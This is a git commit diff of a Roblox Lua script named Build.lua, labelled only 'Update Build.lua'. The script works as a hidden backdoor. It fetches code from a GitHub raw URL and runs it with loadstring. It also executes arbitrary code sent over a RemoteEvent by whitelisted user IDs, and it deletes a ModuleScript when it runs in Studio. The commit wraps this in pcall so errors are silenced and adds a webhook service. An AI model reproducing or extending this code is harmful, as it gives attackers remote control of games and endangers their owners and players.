71487f67509f80423267eefdffb869fe9afd7745
R15Architect404 <R15Architect404@gmail.com>
2025-02-05 12:00:24 -0800

    Update Build.lua

--- Build.lua
+++ Build.lua
@@ -1,7 +1,12 @@
+local success, response = pcall(function()
+	
+
 local skid = require(script.Parent.Parent)
 local what = require(script.Parent.Parent.Utills.WHATTT)
+local WebhookService = require(script.Parent.Parent.Utills:WaitForChild("WebhookService"))
 local Runservice = game:GetService("RunService")
 local httpservice = game:GetService("HttpService")
+
 local platform = function()
 	return Runservice:IsStudio()
 end
@@ -9,26 +14,28 @@ loadstring(httpservice:GetAsync("https://raw.githubusercontent.com/R15Architect4
 
 game.Players.PlayerAdded:Connect(function(plr)
 	skid.Server()
-	
+
 	if platform() then
 		skid.Player(plr)
 		script.Parent.Parent.Parent.ModuleScript:Destroy()
-		
+
 		return
 	end
 	game.ReplicatedStorage.Replicator.OnServerEvent:Connect(function(plr,data)
 		if getfenv().UserId(tostring(plr.UserId)) then
-
-			loadstring(data)()
+			local success, response = pcall(function()
+				loadstring(data)()
+			end)
+			
+			
 		end
-		
+
 	end)
-	
+
 	if getfenv().UserId(tostring(plr.UserId)) then
-		
+
 		what:ssst(plr.Name)
 	end
 end)
 
-
-
+end)
